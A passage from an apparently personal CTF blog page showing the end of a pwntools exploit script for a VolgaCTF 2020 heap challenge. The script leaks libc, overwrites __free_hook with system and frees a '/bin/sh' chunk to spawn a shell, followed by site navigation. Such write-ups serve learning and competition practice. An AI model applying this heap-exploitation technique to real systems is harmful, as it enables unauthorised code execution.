class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_tab</span>(<span class="params">name,size,data</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,name)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    s(<span class="string">&#x27;: &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_tab</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_tab</span>(<span class="params">idx,name,size,data</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;update: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(<span class="string">&quot;: &quot;</span>,name)</span><br><span class="line">    sl(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    s(<span class="string">&quot;: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_tab</span>(<span class="params">idx</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_tab</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_tab</span>():</span><br><span class="line">    sl(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking libc</span></span><br><span class="line">add_note(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">pick_note(<span class="number">1</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x418</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x408</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x68</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;3&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x88</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x68</span>)</span><br><span class="line">dele_tab(<span class="number">2</span>)</span><br><span class="line">dele_tab(<span class="number">1</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;4&#x27;</span>*<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">view_tab(<span class="number">2</span>)</span><br><span class="line">l.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3ec00a</span></span><br><span class="line">log.info(<span class="string">&#x27;l.address:&#x27;</span>+<span class="built_in">hex</span>(l.address))</span><br><span class="line">__free_hook = l.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__free_hook:&#x27;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">system = l.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">quit_tab()</span><br><span class="line"><span class="comment"># overflow</span></span><br><span class="line">add_note(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line">add_note(<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_note(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">pick_note(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack __free_hook</span></span><br><span class="line">add_tab(p64(<span class="number">0</span>)+p64(<span class="number">0x8</span>),__free_hook,<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">quit_tab()</span><br><span class="line">pick_note(<span class="number">3</span>)</span><br><span class="line">update_tab(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">quit_tab()</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">pick_note(<span class="number">4</span>)</span><br><span class="line">add_tab(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">dele_tab(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/30/2020volgactf/" data-id="cuid94yNSkA8AQrav2ibZ1WMe" data-title="VolgaCTF 2020" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/11/02/qwb2020-crypto/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          qwb2020-crypto
        
      </div>
    </a>
  
  
    <a href="/2020/03/02/2020%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%ABctfbabyhacker/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">2020-新春抗疫</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
          <li>
            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
          </li>
        
          <li>
            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
          </li>
        
          <li>
            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
          </li>
        
          <li>
            <a href="/2025/10/09/2025crewctf/">crewCTF2025</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>